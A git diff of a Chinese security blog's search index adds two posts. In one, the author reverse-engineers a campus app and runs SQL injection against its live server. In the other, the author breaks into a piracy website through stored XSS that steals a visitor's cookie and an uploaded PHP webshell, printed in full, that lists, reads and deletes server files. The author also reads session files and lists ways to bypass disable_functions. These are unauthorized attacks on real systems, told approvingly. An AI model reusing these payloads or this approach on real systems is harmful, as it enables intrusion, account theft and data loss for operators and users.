+<p>正好前段时间渗透测试的课上说到以前有同学黑进了学校的邮件系统，想到一般情况下内部系统可能都没啥安全防护措施，就打算试一试，看看能不能分析一波登录和请求，然后再尝试搞个客户端或者Web端的。</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>首先想到的是用Burpsuite对这个APP的流量进行分析，看看能不能捡个漏，通过抓包的方法来找到URL或者API，如果是内嵌Web的就更方便了，如果不是的话搞下API也许也能搞得定。</p>
+<p>在模拟器里装好APP，设置代理到Burpsuite，开抓！</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160012091.png" alt="image-20201107160012091"></p>
+<p>发现登录请求是一个长成这样子的东西，看起来很像Base64编码后的数据，可是用Base64解码并没有看到有用的东西：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160505582.png" alt="image-20201107160505582"></p>
+<p>好吧，到这一步只能盲猜是加密了，将加密后的Hex数据Base64编码。</p>
+<h2 id="逆向APK"><a href="#逆向APK" class="headerlink" title="逆向APK"></a>逆向APK</h2><p>既然是APK的安装包，那么逆一下去看看加密算法也很合理吧。</p>
+<p>在分析之前先看看请求有啥特点，当点击比如”我的账单“的选项的时候，发出去的请求虽然是加密的，但是内容并没有变化，那就可能是对称加密，大概率是ECB模式，没有加盐，没有iv的变化，所以才能明文不变的时候密文也不变。</p>
+<p>为了图省事，直接用dex2jar把class文件转成jar，然后用jd_gui来查看。</p>
+<p>原本想着是不是会有加壳、混淆啥的，对反编译并不抱很大的希望，结果拖进去一看，完全没有任何处理，整个程序的结构非常清晰，简直可以作为安卓逆向的新手入门范例了！那正好，也省的去折腾frida之类的方法了。</p>
+<p>首先找到与程序包名对应的包，如这里的<code>com.xxx.xxxlife</code>，发现一堆的Activity，一般来说登录和密码找回这两个部分的界面内容是最简单的，这里找到了login的Activity：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162214893.png" alt="image-20201107162214893"></p>
+<p>找这个Activity的目的是看看有没有发送请求的部分，毕竟它在发送之前是要先加密之后再发出去的嘛。</p>
+<p>果不其然发现了这个<code>DataUtils.login</code>，这里就是发送登录请求的核心部分。果断单击函数名跟踪过去。</p>
+<p>这个函数里面就是简单的对输入参数进行了拼装，合成一个json字符串，然后调用<code>sendRequest</code>函数将参数发送出去。那么这个<code>sendRequest</code>函数里面一定暗藏玄机。</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162530278.png" alt="image-20201107162530278"></p>
+<p>果不其然，在构建POST请求的时候，对其中的参数部分进行了加密处理，调用了<code>DES.encryptDES</code>函数。继续跟踪：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162704233.png" alt="image-20201107162704233"></p>
+<p>这里简直毫无悬念，密钥、iv全部暴露出来，使用DES CBC的加密方式，5Padding的填充。</p>
+<p>这样一来，通信的加解密就算全搞定了，再回去看看登录的部分，没有Cookie，没有Session，全靠数据里面的UserID……咦？？是不是说我去修改一下Shared_Perference里的数据就可以……花别人的钱了？？？</p>
+<h2 id="用Python验证一下"><a href="#用Python验证一下" class="headerlink" title="用Python验证一下"></a>用Python验证一下</h2><p>对于这个加解密，尝试用Python验证一下。这里我用的是Python3环境（毕竟2.x已经被放弃了呢），pyDes的库。这里因为数据都是JSON格式进行封装，然后再加密，再Base64，所以代码也尝试加了JSON的格式化等，来适应这个系统的数据传输。</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163517509.png" alt="image-20201107163517509"></p>
+<p>加了控制选项，这样可以更方便的控制是否需要编码/解码。效果如下：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163638469.png" alt="image-20201107163638469"></p>
+<p>成功解密~</p>
+<p>如果只是想看看数据，可以用Frida/Objection来Hook加解密函数，可能会更方便，配合脚本什么的还能直接调用sendRequest函数，应该会更爽，不过这里懒得折腾就没进一步去搞了。</p>
+<h2 id="手贱的”更进一步“"><a href="#手贱的”更进一步“" class="headerlink" title="手贱的”更进一步“"></a>手贱的”更进一步“</h2><p>到这里本来不想搞了，结果忽然想到”要不要试一下SQL注入呢“。</p>
+<p>上面那个解出来的请求是请求用户信息（accountinfo），下面的userid是当前用户的id，一串纯数字。第一个想到就是有没有数字型的注入，于是输入了<code>or 1=1</code>，结果，返回了一个巨大的Response：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164222145.png" alt="image-20201107164222145"></p>
+<p>好吧，我觉得我好像成功了？</p>
+<p>每次用脚本加密、再解密数据实在不方便，于是就在上面的Python代码的基础上加了个<code>Requests</code>库，将用户输入的内容自动加密POST发出去，再解密接收到的数据……</p>
+<p>先通过<code>order by 1</code>这样的语句确定当前返回值一共有几列，然后就常规的<code>union select</code>带出数据：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164520544.png" alt="image-20201107164520544"></p>
+<p>从结果中可以看出是一个SQLSERVER 2008的数据库：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164604246.png" alt="image-20201107164604246"></p>
+<p>发现SQLServer的数据库平时遇到的太少了，基本都是MySQL的多，而且想想作为探索来说这么多已经远远超过开始想做的事情了，就不再继续搞下去了吧。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过简单的对这个APP进行了一波分析，发现了一些问题：</p>
+<p>1、密钥信息硬编码</p>
+<p>2、服务端没有有效的身份校验（缺少Cookie等身份验证机制）</p>
+<p>3、存在水平越权（修改userid可以查看其他人的信息）</p>
+<p>4、服务端存在SQL注入</p>
+<p>5、可能存在反序列化的问题（毕竟是JSON数据，这个部分没有验证）</p>
+<p>最后，虽然是校园内部使用的APP，安全性也非常重要，如果被不坏好意的人利用了，不仅仅是我们这些学生的信息遭受损失，系统里的充值信息甚至金钱可能都会遭受损失。</p>
 ]]></content>
       <tags>
-        <tag>Burpsuite</tag>
-        <tag>SQLMap</tag>
-        <tag>文件上传</tag>
+        <tag>Android</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1377,6 +1228,155 @@ Frame 398: <code>Authentication Complete</code><br>
 ]]></content>
       <tags>
         <tag>蓝牙</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>被伪装成“知识付费”的盗版网站坑了钱之后……</title>
+    <url>/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/</url>
+    <content><![CDATA[<p>最近迷上了评书，听了一个片段之后很想找到全集把故事听完，于是在网上搜索。找到了一个貌似资源很全的网站，但是“知识付费”时代，必须充会员才能获取真实的下载地址。由于找了很久都没找到这段评书的资源，于是也没多想，充了12元买了这个资源。</p>
+<span id="more"></span>
+
+<p>但是充完之后发现想要的资源下载链接是一个百度云，资源已经失效了，于是想找找反馈的入口。结果仔细一看才发现，这个网站非常不正规，虽然是通过QQ登录，但是一般网站会有独立的账号体系，而这个网站不能修改用户的信息，看起来就像是没完工的测试项目似的。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806160535564.png" alt="image-20200806160535564"></p>
+<p>而且网站中的资源非常博杂，从相声戏曲，到新媒体运营，再到编程、软件，简直应有尽有，而且全是百度云的资源，看起来像是收集的盗版的东西。大部分的资源页面包括首页推荐的热门资源中都没有任何留言，就像一幢豪华CBD大厦里面空无一人，显得异常诡异。</p>
+<p>查看页面的过程中，只看到了一个站长的联系QQ，加过之后也没反应。那既然这样，还是靠自己一探究竟吧。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>俗话说知己知彼，百战不殆。在正式开始之前先收集一下目标站点的信息。不同于正规的渗透测试，目标就是这个网站，因此就从服务器IP、开放端口、域名、接口这些信息下手。</p>
+<h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>首先通过域名，反查它的IP地址以及子域名信息。这里子域名查询没有啥结果，也和预想的差不多，一个坑钱的小网站应该也不会有什么其他子域。</p>
+<p>这里用了Chrome的插件 hacker target 来进行简单查询：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163057871.png" alt="image-20200806163057871"></p>
+<h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><p>拿到了IP地址，利用shodan初步看看开放了什么端口：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806162913629.png" alt="image-20200806162913629"></p>
+<p>好家伙，有22还有3306？不过shodan向来都不太准，再用其他的工具确认一下。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163328543.png" alt="image-20200806163328543"></p>
+<p>这回发现多了个21，却没有3306了。那最后再用本机的nmap确认一下端口。</p>
+<p>因为直接跑nmap 65535个端口时间太长，而且很容易被云厂商认为是扫描行为而封禁IP，所以可以用这种外围打探的方式先确定基本的端口，最后再用nmap指定端口来确定是否真的开放了。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806164804389.png" alt="image-20200806164804389"></p>
+<p>那么目前能确定的开放端口就是这些。</p>
+<h3 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h3><p>对于开放的端口，简单识别一下，其中<code>21 - FTP</code>, <code>22 - SSH</code>, <code>80,443 - HTTP(S)</code>, <code>3306 - MySQL</code>，那剩下的8888是什么？访问一下界面，从内容看应该是宝塔面板的登录接口，但是做了相应的安全设置。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806200632061.png" alt="image-20200806200632061"></p>
+<p>回到HTTP(S)服务上来，先尝试用在线CMS识别，发现无法识别出使用的CMS，只知道用的是PHP：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201506225.png" alt="image-20200806201506225"></p>
+<p>再看robots.txt文件，也没什么发现：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201628384.png" alt="image-20200806201628384"></p>
+<p>那么目前判断很有可能就是自己开发的系统。而2020年用PHP开发系统，至少是基于某个框架的，因此寻找一下有没有使用框架的蛛丝马迹。很快，在未登录状态下点击发帖按钮有个登录跳转（这部分在下文详细说如何发现的）：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201941920.png" alt="image-20200806201941920"></p>
+<p>咦？这熟悉的 :( 很想是thinkphp呀！</p>
+<p>至此，简单的目标信息收集就结束了，总结如下：</p>
+<p>目标域名：<a href="http://www.xxx.net/">www.xxx.net</a></p>
+<p>子域名：无</p>
+<p>目标IP：3x.xx.xx.x1</p>
+<p>开放端口：21，22，80，443，3306，8888</p>
+<p>CMS信息：暂无</p>
+<p>使用语言：PHP</p>
+<p>使用框架：ThinkPHP（目前版本未知）</p>
+<p>部署环境：宝塔Linux面板</p>
+<h2 id="威胁建模-漏洞分析"><a href="#威胁建模-漏洞分析" class="headerlink" title="威胁建模/漏洞分析"></a>威胁建模/漏洞分析</h2><p>由于是纯黑盒测试，因此不可能有完整的威胁建模进行漏洞分析，只能根据前期收集的信息结合挖洞的过程来慢慢进行威胁建模的部分，因此这两块是合在一起进行的。</p>
+<p>首先根据信息收集的内容，可以知道21和22两个端口大概率是宝塔面板提供的，为了方便用户对网站进行管理。因此这里就不去尝试暴力破解了（印象中宝塔是不允许设置弱密码的），如果Web应用的部分无法突破再考虑端口的暴力破解。同理3306也是这样。</p>
+<p>8888端口是宝塔的控制面板，因为安全策略无法直接使用。因此将注意力放在443端口的Web Appication上。</p>
+<h3 id="HTML-JS分析"><a href="#HTML-JS分析" class="headerlink" title="HTML/JS分析"></a>HTML/JS分析</h3><p>很多情况下，在HTML源码和JS脚本中可能会隐藏诸多秘密，尤其是在目前前端开发喜欢用VUE.js，网站的页面路径很多都会在JS里暴露。</p>
+<p>首先先看首页的HTML源码以及加载的非第三方JS代码。在首页的HTML源码中，发现了一段被注释掉的导航栏代码：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205311823.png" alt="image-20200806205311823"></p>
+<p>试一下<code>/taolun</code>，看看还有没有这个页面：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205618250.png" alt="image-20200806205618250"></p>
+<p>看到这个讨论区，很多都是在吐槽链接失效、资源付费后没用的帖子，难怪要把这个导航栏给注释掉！</p>
+<p>在页面右下角有一个发新帖的按钮，由于是未登录状态，因此点击之后弹出跳转登录的错误页面（即信息收集里看到的 :( 的页面），确定目标使用的框架是Thinkphp。</p>
+<p>看了其他页面的HTML和JS，没有其他有价值的内容了。</p>
+<h3 id="ThinkPHP已知漏洞"><a href="#ThinkPHP已知漏洞" class="headerlink" title="ThinkPHP已知漏洞"></a>ThinkPHP已知漏洞</h3><p>既然确定了框架是TP，那么可以试试已知漏洞，万一有呢~</p>
+<p>可以利用<a href="https://github.com/theLSA/tp5-getshell/%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/theLSA/tp5-getshell/工具来方便的进行检测。</a></p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806211806612.png" alt="image-20200806211806612"></p>
+<p>这里显示三个PoC均为404，可能是路由配置与默认有差距。这里可以执行其他的用例，比如_method变量覆盖漏洞（可参考<a href="https://www.cnblogs.com/WindrunnerMax/p/12558256.html">《ThinkPHP5.0 漏洞测试》</a>）：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806212306138.png" alt="image-20200806212306138"></p>
+<p>这里成功让系统报错，再次确认确实是TP的框架，版本V5.0.0，以及绝对路径等等，这里就不再详细展示。</p>
+<p>测试了其他的已知漏洞，都未能成功触发，此路不通。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>因为用的是TP的框架，因此这里实际上也算是已知漏洞的验证了。因为TP自带防护，而且测试了几个点发现SQL防护应该是打开的，而某些注入是需要特定条件（比如把input变量直接转成数组），因为没有源码，试了几个点都没成功就放弃了&gt;.&lt; …</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS在这里其实没太大作用，整个网站都没找到有与后台的联系，比如问题反馈什么的，不确定管理员是否会去查看，不过抱着试一试的心情，开始找输入点。</p>
+<p>依然还是在<code>/taolun</code>的页面下，找了个帖子进去，发现可以回帖。本着先试试水的心态，复制了这个帖子的标题进去，发现竟然编辑器支持样式！</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806213651303.png" alt="image-20200806213651303"></p>
+<p>那这就说明，很有可能这个接口根本不会对输入进行过滤！</p>
+<p>迅速打开XSS平台，将代码复制下来，用Burpsuite拦住消息，在结尾插入代码，搞定！</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214055993.png" alt="image-20200806214055993"></p>
+<p>先试试我自己：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214330841.png" alt="image-20200806214330841"></p>
+<p>成功读到了我的Cookie。</p>
+<p>但是因为并没有注意邮件，实际上很快就有人看了这个帖子触发了XSS，但等我看到的时候已经失效了……</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>因为XSS的成功，我判断目标站点应该是除了框架默认的安全配置之外并没有进行额外的安全加固。在“发新帖”的部分，允许用户在帖子里上传图片：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806215141784.png" alt="image-20200806215141784"></p>
+<p>这就给了我机会了。先试试简单的，编辑一个文本文件，内容是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>文件名保存成<code>1.jpg</code>。上传的时候用Burp将filename的后缀改成.php：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222704821.png" alt="image-20200806222704821"></p>
+<p>浏览器访问成功：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222905548.png" alt="image-20200806222905548"></p>
+<p>利用这个页面，正好查看一下disable_functions的情况：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222955099.png" alt="image-20200806222955099"></p>
+<p>这里可以看到，应该是宝塔面板的设置，在配置里将所有可能命令执行的函数全部都禁用了，因此上传Webshell也没什么意义，没法用菜刀或者AntSword进行连接。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的步骤试探到文件上传，就已经找到了相应的方法可以进行利用了。本来的想法是通过文件上传进行反弹Shell，进一步提权进行后渗透的步骤，但是这里因为<code>disable_functions</code>卡住，需要绕过。</p>
+<p>在实施绕过这个步骤之前，可以考虑先利用一下3306端口。之前发现3306是开放的，目前又可以上传PHP源码，可以写一个读取文件的PHP代码，将TP的database.php读出来，获取到数据库用户名和密码从而进行连接。</p>
+<p>同时，为了保证之前的phpinfo页面不被其他人发现，写了一个删除文件功能（如果后面不用了还能把上传的这些PHP都删了）：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;dir&quot;</span>];</span><br><span class="line"><span class="variable">$del</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;del&quot;</span>];</span><br><span class="line"><span class="variable">$read</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;read&quot;</span>];</span><br><span class="line"><span class="variable">$fname</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$del</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(unlink(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$read</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=fopen(<span class="variable">$dir</span>.<span class="variable">$fname</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> fread(<span class="variable">$handler</span>, filesize(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">	fclose(<span class="variable">$handler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dir</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=opendir(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">while</span>((<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	closedir(<span class="variable">$handler</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$fn</span>)&#123;</span><br><span class="line">		<span class="variable">$mark</span>=<span class="string">&quot; &quot;</span>;<span class="keyword">if</span>(is_dir(<span class="variable">$dir</span>.<span class="variable">$fn</span>)) <span class="variable">$mark</span>=<span class="string">&quot;+&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$mark</span> . <span class="variable">$fn</span> . <span class="string">&quot; &quot;</span> . @filesize(<span class="variable">$dir</span>.<span class="variable">$fn</span>) .<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实功能很简单，就是列出目录、读取文件、删除文件。</p>
+<h3 id="查看Session文件"><a href="#查看Session文件" class="headerlink" title="查看Session文件"></a>查看Session文件</h3><p>忽然想到，之前XSS累死累活，不就是想搞一个SessionID嘛，这都进来了不就可以直接看了？一般情况下，Session文件是存放在<code>/tmp</code>目录下的，PHP默认是以<code>sess_</code>开头的文件名。</p>
+<p>先用之前上传的脚本试一下：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224057289.png" alt="image-20200806224057289"></p>
+<p>Bingo！确实在这里。Response中文件名后面的数字是文件大小，超时的Session文件中的数据会被删除，因此大小是 0 。</p>
+<p>那找一个大小不为0的，看看内容：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224332843.png" alt="image-20200806224332843"></p>
+<h3 id="查看数据库配置"><a href="#查看数据库配置" class="headerlink" title="查看数据库配置"></a>查看数据库配置</h3><p>同理，通过前面phpinfo中的绝对路径，可以构建../来进入<code>application</code>文件夹，读取<code>database.php</code>文件，获取MySQL用户名密码。</p>
+<p>考虑到宝塔启动MySQL用的是低权限账户，且数据库中的数据目前并没有什么用，还可能又风险，想了想还是不去弄了，反正是个思路。</p>
+<h3 id="突破disable-functions"><a href="#突破disable-functions" class="headerlink" title="突破disable_functions"></a>突破disable_functions</h3><p>没有命令执行的WebShell是没有太大的利用价值的，这里想突破一下disable_functions。</p>
+<p>突破的方法有很多，大致总结如下：</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>PHP版本</th>
+<th>条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>寻找未禁用函数</td>
+<td>任意</td>
+<td>disable_functions中没有禁用某些函数</td>
+</tr>
+<tr>
+<td>LD_PRELOAD劫持</td>
+<td>任意</td>
+<td>Linux环境，putenv()、mail()函数可用</td>
+</tr>
+<tr>
+<td>ShellShock绕过</td>
+<td>5.*</td>
+<td>目标OS有CVE-2014-6271，Linux环境，putenv()、mail()函数可用</td>
+</tr>
+<tr>
+<td>imap_open任意命令执行</td>
+<td>任意</td>
+<td>开启imap扩展，并支持imap_open()函数</td>
+</tr>
+<tr>
+<td>Apache+mod_cgi+.htaccess绕过</td>
+<td>任意</td>
+<td>Apache，启用mod-cgi，允许.htaccess且文件可写</td>
+</tr>
+<tr>
+<td>ImageMagick漏洞绕过</td>
+<td>&gt;=5.4</td>
+<td>开启ImageMagick插件且插件版本&lt;= 3.3.0</td>
+</tr>
+<tr>
+<td>FFI外部函数接口绕过</td>
+<td>7.4</td>
+<td>ffi.enable=true</td>
+</tr>
+</tbody></table>
+<p>从目标环境来看，disable_functions已经禁用全部可能利用的函数，导致不满足全部的利用条件。</p>
+]]></content>
+      <tags>
+        <tag>Burpsuite</tag>
+        <tag>SQLMap</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
